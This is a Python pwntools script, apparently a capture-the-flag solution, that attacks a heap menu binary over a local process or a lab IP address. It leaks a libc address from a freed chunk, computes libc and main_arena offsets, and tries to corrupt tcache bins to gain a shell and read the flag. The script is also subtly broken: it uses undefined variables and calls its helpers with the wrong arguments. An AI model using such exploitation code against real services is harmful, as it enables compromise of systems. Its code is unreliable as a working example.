from pwn import *
import sys

local       = 1
binary      = "./pwn"
local_libc  = "/lib/x86_64-linux-gnu/libc.so.6"
ip          = "192.168.40.10"
port        = 29538
remote_libc = "./libc.so.6"


def main(ip=ip,port=port):
    global p,elf,libc
    elf = ELF(binary)
    if local:
        context.log_level   = "debug"
        p=process(binary)
        # p = process(binary,env={'LD_PRELOAD':'./libc-2.23.so'})
        libc = ELF(local_libc)
        pwn()
    else:
        p=remote(ip,port)
        libc=ELF(remote_libc)
        pwn()

def add(id,size):
	p.recvuntil('Pls input the opcode\n')
	payload='\x01'+p8(id)+p16(size)+'\x05'
	p.send(payload)
def delete(id):
	p.recvuntil('Pls input the opcode\n')
	payload='\x02'+p8(id)+'\x05'
	p.send(payload)
def show(id):
	p.recvuntil('Pls input the opcode\n')
	payload='\x03'+p8(id)+'\x05'
	p.send(payload)
def edit(id,data):
	p.recvuntil('Pls input the opcode\n')
	payload='\x04'+p8(id)+p16(len(data))+str(data)+'\x05'
	p.send(payload)

def pwn():
    add(0,0x440)
    add(1,0x4a0)
    add(2,0x410)
    add(3,0x490)
    add(4,0x430)
    add(5,0x490)
    add(6,0x430)
    add(9,0x4c0)
    add(10,0x490)
    add(11,0x490)
    add(12,0x490)
    add(13,0x490)
    add(14,0x490)
    add(15,0x490)
    add(16,0x490)
    delete(1)
    show(1)

    leak_addr=u64(p.recv(6).ljust(8,'\x00'))
    libc_base=leak_addr-(0x7ffff7fb10d0-0x00007ffff7dbe000)
    main_arena=leak+(0x00007ffff7fb10b0-0x7ffff7fb0cc0)
    addr=libcbase+(0x7ffff7fb0390-0x00007ffff7dbe000) #0x7ffff7fb1660

    payload = add(0,7,0x500)
    payload += delete(0,3)
    payload += edit(0,1,0x20, p64(main_arena)*2+p64(0)+p64(tcache_bins-0x20))
    payload += add(0,8,0x410)
    p.sendline(payload)

    for i in range(7):
        delete(1,i+10)
    delete(1,9)
    show(1,11)
    heap_addr = u64(io.recvuntil(b'\x0a')[-6:-1].ljust(8,b'\x00'))<<12
    heap_base = heap_addr - 0x4000

    p.interactive()

def cat_flag():
    global flag
    p.recv()
    p.sendline("cat flag")
    flag = p.recvuntil('\n',drop=True).strip()
    
def debug(p,content=''):
    if local:
        gdb.attach(p,content)
        raw_input()

if __name__ == "__main__":
    if(len(sys.argv)==3):
        ip      = sys.argv[1]
        port    = sys.argv[2]
    main()
